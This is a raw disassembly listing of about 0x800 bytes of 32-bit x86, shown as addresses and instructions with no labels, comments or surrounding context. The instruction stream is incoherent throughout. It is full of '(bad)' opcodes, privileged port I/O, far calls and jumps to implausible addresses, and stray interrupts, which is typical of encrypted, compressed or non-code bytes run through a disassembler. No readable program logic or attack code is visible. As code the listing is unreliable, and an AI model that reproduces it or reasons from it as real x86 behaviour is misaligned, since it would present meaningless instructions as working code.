  4117cb:	in     eax,dx
  4117cc:	mov    BYTE PTR [edx+0x4],bh
  4117cf:	sub    esp,DWORD PTR cs:[esi+ebx*4-0x69]
  4117d4:	addr16 mov edi,0xf8e38fe5
  4117da:	fadd   DWORD PTR [esi-0x204be892]
  4117e0:	and    eax,0x76e71ec2
  4117e5:	hlt    
  4117e6:	les    ecx,FWORD PTR [ebp+0x6080e005]
  4117ec:	(bad)  
  4117ed:	das    
  4117ee:	mov    al,ds:0xc725ca2f
  4117f3:	das    
  4117f4:	outs   dx,BYTE PTR ds:[esi]
  4117f5:	mov    BYTE PTR [edi+0x28],dh
  4117f8:	mov    ch,0xb7
  4117fa:	mov    ah,0x7d
  4117fc:	mov    bh,0xb7
  4117fe:	xchg   ebx,eax
  4117ff:	xor    BYTE PTR ds:0x6817c40c,al
  411805:	cmp    dh,BYTE PTR es:[ebp+0x221247cc]
  41180c:	xchg   edi,ecx
  41180e:	addr16 in eax,0x11
  411811:	sar    eax,1
  411813:	iret   
  411814:	jbe    0x411828
  411816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411817:	in     al,0xf4
  411819:	inc    ebp
  41181a:	inc    eax
  41181b:	inc    esi
  41181c:	pusha  
  41181d:	jg     0x41186a
  41181f:	jo     0x4117d1
  411821:	(bad)  
  411822:	repnz sub edx,DWORD PTR [edx+0x6ffaebf3]
  411829:	pop    ds
  41182a:	mov    WORD PTR [edx+0x2c],gs
  41182d:	jb     0x41180a
  41182f:	mov    ah,0xba
  411831:	xchg   BYTE PTR [esp+edi*1],ah
  411834:	sahf   
  411835:	sbb    eax,0x9d0f0bd4
  41183a:	inc    esp
  41183b:	add    BYTE PTR ds:0x5e970d6b,0xfb
  411842:	popf   
  411843:	pop    esi
  411844:	rcr    DWORD PTR [edi-0x17],cl
  411847:	rcl    DWORD PTR [ecx+esi*4],0xac
  41184b:	lahf   
  41184c:	xor    DWORD PTR cs:[bx+di-0x7060],0xf455792
  411856:	push   edi
  411857:	xor    ecx,DWORD PTR [eax+0x24]
  41185a:	push   edx
  41185b:	cmp    al,0x66
  41185d:	xchg   esi,eax
  41185e:	retf   0x137f
  411861:	jnp    0x411825
  411863:	clc    
  411864:	push   ecx
  411865:	int    0x1e
  411867:	inc    edi
  411868:	and    DWORD PTR [ecx],esi
  41186a:	push   ecx
  41186b:	pop    eax
  41186c:	mov    al,ds:0xd0fc4d39
  411871:	and    bl,ch
  411873:	mov    eax,ds:0x13f688d3
  411878:	sub    eax,0xb888fdca
  41187d:	sbb    bh,BYTE PTR [ebx+0x51]
  411880:	or     eax,0x42baa8d1
  411885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411886:	retf   0x7539
  411889:	xchg   esp,eax
  41188a:	outs   dx,BYTE PTR ds:[esi]
  41188b:	mov    al,ds:0x576be469
  411890:	lods   eax,DWORD PTR ds:[esi]
  411891:	ds cli 
  411893:	cs js  0x4118a1
  411896:	fnstcw WORD PTR [esi]
  411898:	(bad)  
  411899:	arpl   WORD PTR [ebp-0x6f],bx
  41189c:	sahf   
  41189d:	xlat   BYTE PTR ds:[ebx]
  41189e:	push   cs
  41189f:	jno    0x4118dd
  4118a1:	pop    edi
  4118a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118a3:	lods   eax,DWORD PTR ds:[esi]
  4118a4:	bound  esi,QWORD PTR ds:0xafc338a1
  4118aa:	sbb    bh,BYTE PTR [ebx+0x294963e0]
  4118b0:	shl    DWORD PTR [ebp+ebp*2+0x6e36536d],cl
  4118b7:	stc    
  4118b8:	call   0x1b06aedc
  4118bd:	jns    0x4118a4
  4118bf:	sub    al,0x54
  4118c1:	cli    
  4118c2:	dec    ecx
  4118c3:	mov    eax,ds:0x212ea061
  4118c8:	stc    
  4118c9:	or     ebx,DWORD PTR [eax-0x15970b63]
  4118cf:	mov    edx,0x4c9f1c67
  4118d4:	cmp    DWORD PTR [ebx-0x3f2d15ab],ecx
  4118da:	push   edi
  4118db:	adc    ebp,DWORD PTR [edi+0x30]
  4118de:	xchg   ebx,eax
  4118df:	dec    edi
  4118e0:	sub    DWORD PTR [esi+ebp*4+0x65],ebp
  4118e4:	(bad)  
  4118e5:	daa    
  4118e6:	in     eax,0x70
  4118e8:	adc    BYTE PTR [edx-0x159d68ea],ch
  4118ee:	or     edi,DWORD PTR [edi+0xc]
  4118f1:	dec    ebx
  4118f2:	jmp    0x7b65e896
  4118f7:	fdivrp st(7),st
  4118f9:	daa    
  4118fa:	(bad)  
  4118fb:	cmc    
  4118fc:	dec    esp
  4118fd:	fwait
  4118fe:	xchg   ebx,eax
  4118ff:	sar    DWORD PTR [esi+0x6d64b3b0],0x6c
  411906:	jo     0x411919
  411908:	jge    0x411898
  41190a:	jnp    0x4118ca
  41190c:	into   
  41190d:	lods   eax,DWORD PTR ds:[esi]
  41190e:	out    dx,eax
  41190f:	lds    ecx,FWORD PTR [eax+edx*1]
  411912:	fisub  WORD PTR [edx+0x4]
  411915:	jbe    0x4118b9
  411917:	mov    ebp,0xd25f58a2
  41191c:	mov    esp,ebx
  41191e:	in     al,0x97
  411920:	mov    bh,0xb4
  411922:	xchg   esi,eax
  411923:	cmp    BYTE PTR [ebp-0x177f6fcf],bl
  411929:	jno    0x411960
  41192b:	std    
  41192c:	aad    0x59
  41192e:	mov    eax,ds:0x5caceffd
  411933:	in     al,dx
  411934:	outs   dx,DWORD PTR ds:[esi]
  411935:	in     eax,0xcf
  411937:	pop    ecx
  411938:	into   
  411939:	retf   0xffe8
  41193c:	call   0xaa03:0xa3bd1133
  411943:	mov    edi,0x6e0de2f7
  411948:	stos   BYTE PTR es:[edi],al
  411949:	inc    esi
  41194a:	test   al,0x2c
  41194c:	mov    ds,WORD PTR ds:0xa5e863
  411952:	je     0x411934
  411954:	cmp    edi,ebx
  411956:	pop    edi
  411957:	inc    ebp
  411958:	in     eax,0x60
  41195a:	sti    
  41195b:	pop    esi
  41195c:	push   edx
  41195d:	or     BYTE PTR [ecx-0x15a60c39],al
  411963:	sub    DWORD PTR [edi],0x7e9ab616
  411969:	cmp    eax,0x90dc6235
  41196e:	xlat   BYTE PTR ds:[ebx]
  41196f:	popa   
  411970:	xchg   BYTE PTR [ebx],al
  411972:	xchg   edi,eax
  411973:	dec    ebp
  411974:	sbb    al,0xbc
  411976:	outs   dx,DWORD PTR ds:[esi]
  411977:	es push cs
  411979:	psubd  mm7,mm3
  41197c:	enter  0xce16,0xe
  411980:	sti    
  411981:	mov    edx,0x4d6cb2cf
  411986:	sar    DWORD PTR [ebx+0x78],0x22
  41198a:	add    bl,dl
  41198c:	cmp    BYTE PTR [ebx-0x1a],al
  41198f:	inc    esi
  411991:	dec    ebp
  411992:	jno    0x4119c5
  411994:	arpl   WORD PTR [edi+edi*2-0x357189c4],bp
  41199b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41199c:	mov    dh,0xc7
  41199e:	jl     0x411a0d
  4119a0:	call   0x714af146
  4119a5:	xlat   BYTE PTR ds:[ebx]
  4119a6:	sbb    eax,0x227ef6fd
  4119ab:	cmp    DWORD PTR [edi+0x4b],ebx
  4119ae:	stos   BYTE PTR es:[edi],al
  4119af:	push   ecx
  4119b0:	push   eax
  4119b1:	sahf   
  4119b2:	call   0x1bbc:0x1ff26e0a
  4119b9:	cwde   
  4119ba:	pop    esi
  4119bb:	bound  eax,QWORD PTR [ebx]
  4119bd:	loop   0x411969
  4119bf:	in     eax,dx
  4119c0:	push   esp
  4119c1:	scas   eax,DWORD PTR es:[edi]
  4119c2:	push   eax
  4119c3:	jnp    0x4119b0
  4119c5:	fnstcw WORD PTR [ecx-0x6448b5fd]
  4119cb:	out    dx,eax
  4119cc:	mov    al,ds:0x601622bf
  4119d1:	jb     0x4119ab
  4119d3:	sbb    eax,0xb4e72af6
  4119d8:	(bad)  
  4119da:	ret    0x815c
  4119dd:	or     DWORD PTR ds:0xd2d7f6fb,eax
  4119e3:	enter  0xda62,0x47
  4119e7:	or     BYTE PTR [ebx],dl
  4119e9:	loopne 0x4119e9
  4119eb:	xor    BYTE PTR [ebx+0x5],0xca
  4119ef:	bound  esp,QWORD PTR [ecx-0x7d22a520]
  4119f5:	(bad)  ds:0x97c474ff
  4119fb:	push   ecx
  4119fc:	pop    ecx
  4119fd:	call   0xe309:0x61e566cf
  411a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a05:	mov    ch,BYTE PTR [ebx+0x7e43ec46]
  411a0b:	dec    edi
  411a0c:	pop    eax
  411a0d:	adc    BYTE PTR [edx],bl
  411a0f:	or     edx,DWORD PTR [edi]
  411a11:	ja     0x411a90
  411a13:	adc    BYTE PTR [esi-0x1ec62257],ch
  411a19:	xchg   ebx,eax
  411a1a:	inc    edi
  411a1b:	sbb    eax,0x767ab5df
  411a20:	aas    
  411a21:	mov    al,ds:0x6faeca67
  411a26:	cmp    dh,BYTE PTR [ebx-0x7af7a12b]
  411a2c:	les    edi,FWORD PTR [edx+0x7f6535a3]
  411a32:	xor    al,0xab
  411a34:	jnp    0x411a3e
  411a36:	gs inc ecx
  411a38:	sbb    edi,DWORD PTR [edx]
  411a3a:	out    dx,eax
  411a3b:	inc    edi
  411a3c:	retf   
  411a3d:	lahf   
  411a3e:	xchg   DWORD PTR [edi+0x33f6d66a],edi
  411a44:	test   BYTE PTR [ebp+0x52],0x2d
  411a48:	out    0x96,eax
  411a4a:	repnz or bh,BYTE PTR gs:[ebx+0x2ccb61fd]
  411a52:	(bad)  
  411a53:	dec    edi
  411a54:	jae    0x411a0a
  411a56:	aaa    
  411a57:	out    dx,eax
  411a58:	cmp    BYTE PTR [edx+0xfafbecf],dh
  411a5e:	imul   DWORD PTR [ebx-0x22371cc2]
  411a64:	add    al,0xb5
  411a66:	bound  edx,QWORD PTR [esi]
  411a68:	loop   0x411a5c
  411a6a:	mov    edi,0x77b18ee9
  411a6f:	test   eax,0xff169301
  411a74:	je     0x411ad2
  411a76:	aaa    
  411a77:	sub    eax,0x81e31d53
  411a7c:	inc    eax
  411a7d:	dec    esi
  411a7e:	mov    edi,0x9eb47c0
  411a83:	inc    ecx
  411a84:	xor    eax,0x9409509a
  411a89:	push   ecx
  411a8a:	mov    es,WORD PTR [ecx+eax*4]
  411a8d:	(bad)  
  411a8e:	je     0x411b01
  411a90:	jle    0x411ab7
  411a92:	pop    eax
  411a93:	dec    edx
  411a94:	sub    eax,0x111d47ff
  411a99:	cwde   
  411a9a:	cmp    eax,0x378c8a44
  411a9f:	stc    
  411aa0:	push   edi
  411aa1:	aas    
  411aa2:	clc    
  411aa3:	xchg   edx,eax
  411aa4:	mov    ecx,0x398777e5
  411aa9:	sub    DWORD PTR [ecx+0x3cd920f5],eax
  411aaf:	push   eax
  411ab0:	stos   BYTE PTR es:[edi],al
  411ab1:	jno    0x411a5b
  411ab3:	mov    ds:0x7dc8f186,eax
  411ab8:	xchg   edi,eax
  411ab9:	int    0x3b
  411abb:	inc    ebx
  411abc:	pop    ebp
  411abd:	push   es
  411abe:	imul   ecx,DWORD PTR [edi-0x20f95b0],0xffffff8d
  411ac5:	mov    ebx,0x3eb4a45e
  411aca:	mov    edx,0x2cb91bc1
  411acf:	inc    BYTE PTR [ecx]
  411ad1:	mov    eax,DWORD PTR [eax-0x35]
  411ad4:	push   edx
  411ad5:	icebp  
  411ad6:	data16 je 0x411b0f
  411ad9:	rcr    dl,0x9b
  411adc:	repnz dec edx
  411ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411adf:	call   FWORD PTR [edi]
  411ae1:	loope  0x411aee
  411ae3:	(bad)  
  411ae4:	mov    eax,0x9782e6dd
  411ae9:	push   edx
  411aea:	jbe    0x411a87
  411aec:	not    BYTE PTR [edx+0x13378517]
  411af2:	ss cdq 
  411af4:	retf   0xc1e2
  411af7:	int3   
  411af8:	mov    ecx,0x18a9f483
  411afd:	ja     0x411b41
  411aff:	lea    ebp,[esi]
  411b01:	out    dx,al
  411b02:	sub    BYTE PTR ds:0xb7275f48,dl
  411b08:	aad    0x4e
  411b0a:	mov    DWORD PTR [esi+0x53],edx
  411b0d:	(bad)  
  411b0e:	(bad)  
  411b0f:	push   ds
  411b10:	jno    0x411b76
  411b12:	pop    ecx
  411b13:	xor    al,0x70
  411b15:	and    bh,cl
  411b17:	fcom   DWORD PTR [esi+0x15]
  411b1a:	imul   eax,DWORD PTR [si],0x1c
  411b1e:	or     ah,ch
  411b20:	jb     0x411b04
  411b22:	jne    0x411b2e
  411b24:	cs in  al,0x3f
  411b27:	sub    edx,0x5e
  411b2a:	push   esi
  411b2b:	xor    al,0xae
  411b2d:	ffreep st(4)
  411b2f:	in     eax,dx
  411b30:	imul   edi,DWORD PTR [edx+0x44],0xffffff80
  411b34:	inc    ebp
  411b35:	int3   
  411b36:	mov    dh,bh
  411b38:	repz push esi
  411b3a:	xor    BYTE PTR [eax-0x57],bh
  411b3d:	mov    esp,0xb67a1b4a
  411b42:	ds jmp 0x2d4:0x5b53353
  411b4a:	lahf   
  411b4b:	jmp    0x411ba8
  411b4d:	ds push esi
  411b4f:	sbb    eax,0x5ddbd6d9
  411b54:	mov    esp,0xe514b9e6
  411b59:	adc    esi,edx
  411b5b:	jmp    0x411b6e
  411b5d:	pop    ecx
  411b5e:	popa   
  411b5f:	fisttp DWORD PTR [esi-0x1aa8a2b9]
  411b65:	mov    dh,0xde
  411b67:	adc    eax,0xe4d29f90
  411b6c:	add    al,0xce
  411b6e:	mov    ch,0x2d
  411b70:	bnd jb 0x411bd7
  411b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b74:	fs mov ebp,0xc97a4181
  411b7a:	or     bh,BYTE PTR ds:[esi-0x486e3142]
  411b81:	mov    ah,dh
  411b83:	push   0xa9d80806
  411b88:	repz adc dh,BYTE PTR [edx]
  411b8b:	or     ch,BYTE PTR [edx+0x4b]
  411b8e:	jne    0x411b37
  411b90:	mov    esp,0xbd11940f
  411b95:	enter  0xb48b,0xca
  411b99:	icebp  
  411b9a:	int3   
  411b9b:	repnz loope 0x411bb2
  411b9e:	pop    ebp
  411b9f:	adc    al,dh
  411ba1:	sbb    ebp,ecx
  411ba3:	lds    esi,FWORD PTR [ecx+0x5a]
  411ba6:	and    al,0x4b
  411ba8:	add    BYTE PTR [esi],bh
  411baa:	dec    DWORD PTR [esi-0xd]
  411bad:	pop    edx
  411bae:	cwde   
  411baf:	adc    eax,0xd8d2a18b
  411bb4:	lahf   
  411bb5:	ret    
  411bb6:	fwait
  411bb7:	and    DWORD PTR [esi+0x18],edx
  411bba:	jmp    0x411b3e
  411bbc:	ins    DWORD PTR es:[edi],dx
  411bbd:	pop    es
  411bbe:	fst    QWORD PTR [edx-0x93a33a]
  411bc4:	leave  
  411bc5:	fbld   TBYTE PTR [eax+0x45acae95]
  411bcb:	mov    DWORD PTR [edi],edi
  411bcd:	test   bl,ah
  411bcf:	dec    esi
  411bd0:	mov    ds:0x77005465,al
  411bd5:	aas    
  411bd6:	andps  xmm6,xmm4
  411bd9:	mov    ebx,0x9319e154
  411bde:	add    ecx,DWORD PTR [esi]
  411be0:	xchg   esp,eax
  411be1:	loopne 0x411bfc
  411be3:	fidivr WORD PTR [ebx+0x62]
  411be6:	push   ebp
  411be7:	iret   
  411be8:	jg     0x411c48
  411bea:	xor    al,0x34
  411bec:	jmp    0xc6b8:0xebd78328
  411bf3:	aam    0x1
  411bf5:	sbb    BYTE PTR [esi+ebp*2-0x80],0x35
  411bfa:	shr    DWORD PTR [eax+0x24],cl
  411bfd:	(bad)  
  411bff:	lods   eax,DWORD PTR ds:[esi]
  411c00:	popf   
  411c01:	(bad)  
  411c02:	ud2    
  411c04:	cmp    dh,dl
  411c06:	pop    eax
  411c07:	(bad)  
  411c08:	sub    dh,al
  411c0a:	lods   al,BYTE PTR ds:[esi]
  411c0b:	retf   0xfda8
  411c0e:	sti    
  411c0f:	jnp    0x411c48
  411c11:	jp     0x411c0f
  411c13:	sub    eax,0x151a5ebc
  411c18:	aad    0x2a
  411c1a:	rcl    ebx,1
  411c1c:	mov    ch,0xc1
  411c1e:	or     edi,DWORD PTR [eax-0x62]
  411c21:	in     al,0xb6
  411c23:	clc    
  411c24:	and    eax,0xbedb477d
  411c29:	outs   dx,BYTE PTR ds:[esi]
  411c2a:	xor    esp,ecx
  411c2c:	int    0x1a
  411c2e:	mov    al,ds:0x929b64dc
  411c33:	or     dl,BYTE PTR [ebx]
  411c35:	push   ecx
  411c36:	adc    DWORD PTR [ebp-0x53f45c56],0xfffffffc
  411c3d:	arpl   cx,ax
  411c3f:	mov    esi,0xf54d813b
  411c44:	adc    eax,0x98eb96f3
  411c49:	pop    edi
  411c4a:	sar    BYTE PTR [ebx],cl
  411c4c:	stos   DWORD PTR es:[edi],eax
  411c4d:	test   BYTE PTR [edi+0x10],bl
  411c50:	sbb    edx,eax
  411c52:	cmp    BYTE PTR [edi+0x626ba22],bl
  411c58:	call   0x24e3:0x9f254f1
  411c5f:	inc    ecx
  411c60:	not    BYTE PTR [edi-0x47b9214f]
  411c66:	cmp    dl,cl
  411c68:	mov    esi,ecx
  411c6a:	fwait
  411c6b:	push   DWORD PTR [ebx+0x402a4776]
  411c71:	ins    BYTE PTR es:[edi],dx
  411c72:	lds    ebp,FWORD PTR [ebx]
  411c74:	int3   
  411c75:	jns    0x411cb1
  411c77:	jo     0x411c74
  411c79:	aam    0x95
  411c7b:	fs leave 
  411c7d:	cmp    DWORD PTR [ecx+0x533d6486],edi
  411c83:	mov    eax,0xef36a215
  411c88:	xor    DWORD PTR [eax],0xffffff97
  411c8b:	fwait
  411c8c:	hlt    
  411c8d:	imul   ebp,DWORD PTR [esi+0x6f],0xffffffb1
  411c91:	sti    
  411c92:	jge    0x411ce1
  411c94:	outs   dx,DWORD PTR ds:[esi]
  411c95:	inc    ecx
  411c96:	pop    ebp
  411c97:	adc    bl,bh
  411c99:	fdivr  DWORD PTR [ebp-0x47]
  411c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c9d:	or     ecx,DWORD PTR [eax]
  411c9f:	or     eax,0x286c4166
  411ca4:	mov    edx,0x50fedb62
  411ca9:	pop    esp
  411caa:	pushf  
  411cab:	call   0xe1c644a6
  411cb0:	cdq    
  411cb1:	xchg   BYTE PTR [ebx+0x66d6faab],bl
  411cb7:	test   eax,0xffb2828a
  411cbc:	int    0x11
  411cbe:	fstp   QWORD PTR [edx]
  411cc0:	sahf   
  411cc1:	push   ds
  411cc2:	and    BYTE PTR [eax],ah
  411cc4:	imul   ebx,DWORD PTR [esi+0xcee1d9],0xa008d542
  411cce:	or     ah,dh
  411cd0:	ins    DWORD PTR es:[edi],dx
  411cd1:	adc    eax,0x7d868087
  411cd6:	jmp    0x40fa1ace
  411cdb:	icebp  
  411cdc:	mov    ebp,0xeed85243
  411ce1:	(bad)  
  411ce2:	pushf  
  411ce3:	sub    eax,0xde868f7a
  411ce8:	jmp    0x38862bd7
  411ced:	sbb    al,0x65
  411cef:	call   0x54e:0xe6b68a5d
  411cf6:	js     0x411c87
  411cf8:	jge    0x411c86
  411cfa:	stos   DWORD PTR es:[edi],eax
  411cfb:	test   al,0x15
  411cfd:	shl    BYTE PTR [ebx-0x31a48670],0xeb
  411d04:	int3   
  411d05:	push   ss
  411d06:	loopne 0x411d08
  411d08:	pop    ecx
  411d09:	nop
  411d0a:	inc    edx
  411d0b:	cs push cs
  411d0d:	add    DWORD PTR [eax+0x1f],esi
  411d10:	mov    edi,0xb7922759
  411d15:	pop    esp
  411d16:	pop    ebp
  411d17:	(bad)  
  411d18:	addr16 aam 0xd6
  411d1b:	mov    dl,0xc0
  411d1d:	lea    edx,[eax]
  411d1f:	xchg   ebx,eax
  411d20:	(bad)  
  411d21:	aas    
  411d22:	rol    BYTE PTR [eax],0x1a
  411d25:	fisubr DWORD PTR [ecx+edi*8-0x332215a]
  411d2c:	push   0x45e051ff
  411d31:	add    DWORD PTR [esi-0x13],ebp
  411d34:	ds push eax
  411d36:	xlat   BYTE PTR ds:[ebx]
  411d37:	sub    DWORD PTR [ebx],edi
  411d39:	mov    bh,0x4f
  411d3b:	push   0x3f
  411d3d:	push   esp
  411d3e:	sub    eax,DWORD PTR [ebx-0x7]
  411d41:	fcomp  QWORD PTR [esi]
  411d43:	xchg   ebp,eax
  411d44:	repnz test DWORD PTR [eax-0x6a837bdb],0xfd85bc34
  411d4f:	xor    DWORD PTR [edx],edi
  411d51:	repz aad 0x1c
  411d54:	sbb    eax,0x3841d0ae
  411d59:	imul   esi,DWORD PTR [esi-0x63],0x5
  411d5d:	add    BYTE PTR [ecx+0xac156b6],ch
  411d63:	mov    eax,ds:0xe77bf859
  411d68:	jecxz  0x411cf6
  411d6a:	push   0x73421b39
  411d6f:	jecxz  0x411d58
  411d71:	cmp    BYTE PTR [esi+edi*4+0x1f],0x30
  411d76:	sti    
  411d77:	popf   
  411d78:	sub    DWORD PTR [edx],0xcd53dfdf
  411d7e:	cmp    ebp,ebx
  411d80:	push   esp
  411d81:	pop    ebp
  411d82:	pop    es
  411d83:	int    0xa0
  411d85:	pop    ds
  411d86:	fadd   st,st(0)
  411d88:	scas   eax,DWORD PTR es:[edi]
  411d89:	mov    esp,0x4a130c2d
  411d8e:	ror    ecx,0x5e
  411d91:	sbb    edi,0xffffffcf
  411d94:	inc    ebp
  411d95:	icebp  
  411d96:	jno    0x411d2b
  411d98:	mov    cl,ch
  411d9a:	dec    ecx
  411d9b:	add    bh,BYTE PTR [esp+edx*1+0x45]
  411d9f:	retf   0x446d
  411da2:	mov    edx,0x4af5fefb
  411da7:	out    dx,eax
  411da8:	mov    cl,0xa3
  411daa:	in     al,0x81
  411dac:	addr16 push esp
  411dae:	inc    ebx
  411daf:	and    ecx,DWORD PTR [eax+0x7d]
  411db2:	test   al,0x2b
  411db4:	aam    0x6b
  411db6:	dec    esp
  411db7:	repnz and bl,bl
  411dba:	mov    ebp,0x8362dc37
  411dbf:	rol    eax,cl
  411dc1:	ja     0x411d7a
  411dc3:	(bad)  
  411dc4:	lds    ebp,FWORD PTR [eax-0x42e8637e]
  411dca:	ret    
  411dcb:	sti    
  411dcc:	inc    esp
  411dcd:	mov    eax,ds:0xe64e1383
  411dd2:	call   0xad65:0x5599478f
  411dd9:	pop    esp
  411dda:	test   DWORD PTR [edx],0x23e203ad
  411de0:	(bad)  [ecx+0x3f6bf4b6]
  411de6:	call   0x1ff7408f
  411deb:	dec    edi
  411dec:	leave  
  411ded:	push   edx
  411dee:	mov    al,ds:0xac40c1a6
  411df3:	loop   0x411da5
  411df5:	or     BYTE PTR [ecx-0x36708e2],ah
  411dfb:	hlt    
  411dfc:	jmpw   0x4833
  411e00:	xor    al,BYTE PTR [esi]
  411e02:	out    dx,eax
  411e03:	mov    esp,0x7d8722d6
  411e08:	jl     0x411e62
  411e0a:	ds pop ss
  411e0c:	mov    ds:0x2992d48c,eax
  411e11:	stc    
  411e12:	or     dh,dl
  411e14:	imul   edx,ebp,0x17de4c44
  411e1a:	push   esi
  411e1b:	clc    
  411e1c:	mov    cl,0x74
  411e1e:	int3   
  411e1f:	loope  0x411e35
  411e21:	jnp    0x411e77
  411e23:	mov    al,ds:0xb2a41c37
  411e28:	add    ebp,0x1f
  411e2b:	lods   eax,DWORD PTR ds:[esi]
  411e2c:	ins    BYTE PTR es:[edi],dx
  411e2d:	dec    ecx
  411e2e:	das    
  411e2f:	cmp    DWORD PTR ds:0x683c262e,esp
  411e35:	jg     0x411e18
  411e37:	dec    eax
  411e38:	xchg   esi,eax
  411e39:	cwde   
  411e3a:	xchg   esi,eax
  411e3b:	mov    bh,0x50
  411e3d:	xchg   edx,eax
  411e3e:	and    dl,BYTE PTR [ebx]
  411e40:	dec    ebp
  411e41:	sbb    dh,BYTE PTR [esi-0x6f53eea8]
  411e47:	mov    edi,0x67ff9afa
  411e4c:	mov    ah,0x65
  411e4e:	xchg   ebx,eax
  411e4f:	imul   esi,DWORD PTR [eax],0xbfe63ab2
  411e55:	psrlw  mm2,mm3
  411e58:	aad    0x28
  411e5a:	mov    WORD PTR [esi+edx*1+0x258cd8e],cs
  411e61:	loope  0x411e09
  411e63:	je     0x411ee2
  411e65:	push   eax
  411e66:	test   DWORD PTR [edi+0x16461815],edx
  411e6c:	and    eax,0xf745a979
  411e71:	pushf  
  411e72:	mov    eax,ds:0xbd2efedb
  411e77:	fiadd  DWORD PTR ds:0x60cdd87b
  411e7d:	jge    0x411e58
  411e7f:	dec    ebx
  411e80:	hlt    
  411e81:	leave  
  411e82:	ss mul dl
  411e85:	out    dx,eax
  411e86:	je     0x411e09
  411e88:	in     eax,0xe5
  411e8a:	retf   
  411e8b:	xor    bl,bh
  411e8d:	ret    
  411e8e:	or     ah,BYTE PTR [edi]
  411e90:	neg    dl
  411e92:	aas    
  411e93:	stc    
  411e94:	lods   eax,DWORD PTR ds:[esi]
  411e95:	scas   eax,DWORD PTR es:[edi]
  411e96:	arpl   WORD PTR [eax-0x3a2c990],sp
  411e9c:	fadd   DWORD PTR ds:0xcb4bd05
  411ea2:	add    DWORD PTR [eax+0x3e],edx
  411ea5:	xor    BYTE PTR gs:[ecx+0x47],cl
  411ea9:	out    0x9d,eax
  411eab:	cmp    al,0xdf
  411ead:	mov    ecx,0xda2db2e2
  411eb2:	add    DWORD PTR [eax-0x2f],ebp
  411eb5:	xacquire xchg DWORD PTR [edi],eax
  411eb8:	rcr    dh,1
  411eba:	xchg   ecx,eax
  411ebb:	pusha  
  411ebc:	mov    ebx,0xed857fd1
  411ec1:	xchg   BYTE PTR fs:[ebp+0x69e72353],dl
  411ec8:	jle    0x411ecc
  411eca:	sbb    eax,0xcca0f0c1
  411ecf:	pop    ebx
  411ed0:	popa   
  411ed1:	outs   dx,BYTE PTR ds:[esi]
  411ed3:	leave  
  411ed4:	cs rcr eax,cl
  411ed7:	xchg   edx,eax
  411ed8:	dec    ebp
  411ed9:	or     al,0x47
  411edb:	mov    esp,0xf59fbd93
  411ee0:	loopne 0x411f00
  411ee2:	aas    
  411ee3:	fcomp  QWORD PTR [ecx+0x5497faea]
  411ee9:	adc    edx,DWORD PTR [esi-0x476e667e]
  411eef:	mov    al,ds:0x97eed8bd
  411ef4:	adc    ah,bh
  411ef6:	push   eax
  411ef7:	(bad)  
  411ef8:	fcmovnbe st,st(5)
  411efa:	loop   0x411ee5
  411efc:	enter  0x3dd0,0xdf
  411f00:	sbb    ch,cl
  411f02:	xor    ebp,DWORD PTR [esi+edx*4+0x42]
  411f06:	int    0x91
  411f08:	fdiv   QWORD PTR [edx-0x5e3b62e1]
  411f0e:	xchg   ebx,eax
  411f0f:	dec    edx
  411f10:	stc    
  411f11:	add    BYTE PTR [ebp+0x60c8ec],bl
  411f17:	jmp    0xbcaa618a
  411f1c:	mov    eax,0x5fdac03b
  411f21:	ret    0x2291
  411f24:	scas   al,BYTE PTR es:[edi]
  411f25:	test   eax,0xcb012518
  411f2a:	mov    edi,0x1143d453
  411f2f:	jns    0x411f4b
  411f31:	dec    DWORD PTR [edi-0x14]
  411f34:	stos   BYTE PTR es:[edi],al
  411f35:	cmp    cl,BYTE PTR [ecx+esi*8+0x70b35a76]
  411f3c:	cmp    edi,DWORD PTR [ecx-0x10]
  411f3f:	dec    ebp
  411f40:	(bad)  
  411f41:	scas   al,BYTE PTR es:[edi]
  411f42:	mov    bl,0xba
  411f44:	loope  0x411f10
  411f46:	push   0xda49b5e6
  411f4b:	inc    esi
  411f4c:	push   esi
  411f4d:	out    0xc,al
  411f4f:	call   0x91e8:0x39fbc51a
  411f56:	xor    BYTE PTR [edi-0x43c659b9],cl
  411f5c:	das    
  411f5d:	push   edx
  411f5e:	ins    DWORD PTR es:[edi],dx
  411f5f:	push   ds
  411f60:	push   ebx
  411f61:	push   eax
  411f62:	stos   DWORD PTR es:[edi],eax
  411f63:	push   ecx
  411f64:	push   eax
  411f65:	test   DWORD PTR [esi],edx
  411f67:	jecxz  0x411f92
  411f69:	xchg   dl,dh
  411f6b:	call   0xc66ca3d8
  411f70:	lahf   
  411f71:	or     DWORD PTR [edx],ebp
  411f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f74:	mov    eax,0xdaf3084a
  411f79:	ret    
  411f7a:	mov    esi,0x20fa3877
  411f7f:	test   eax,0x5e032cd
  411f84:	mov    ebp,0x71a2ac46
  411f89:	push   ebx
  411f8a:	in     eax,0xd6
  411f8c:	(bad)  
  411f8d:	cs imul edi,eax,0xffffffc7
  411f91:	daa    
  411f92:	hlt    
  411f93:	jb     0x411fe3
  411f95:	add    eax,0x96fa0565
  411f9a:	and    BYTE PTR [ecx+0x2],ch
  411f9d:	jle    0x41200b
  411f9f:	cmp    eax,0x4a98585b
  411fa4:	setb   BYTE PTR [esi+0x21be0f3c]
  411fab:	leave  
  411fac:	jmp    0x411f5e
  411fae:	rcr    BYTE PTR cs:[eax-0x2d],0xa7
  411fb3:	repnz test eax,0xfbf10cad
  411fb9:	xor    edi,DWORD PTR [edi-0x7682dee9]
  411fbf:	repnz cdq 
  411fc1:	or     dh,0x8
  411fc4:	(bad)  
  411fc5:	addr16 pop esp
  411fc7:	xchg   BYTE PTR [ecx],dl
  411fc9:	cmp    esi,eax
  411fcb:	mov    DWORD PTR [ecx],edi
  411fcd:	add    al,0x78
  411fcf:	mov    ebx,0xa1adc64e
  411fd4:	jecxz  0x412050
  411fd6:	adc    al,0x29
  411fd8:	shl    DWORD PTR [eax+0x555bbf3d],1
  411fde:	je     0x411fb9
  411fe0:	xor    ebx,ecx
  411fe2:	jb     0x41203c
  411fe4:	rol    DWORD PTR [ecx-0x7c],cl
  411fe7:	jnp    0x411fb9
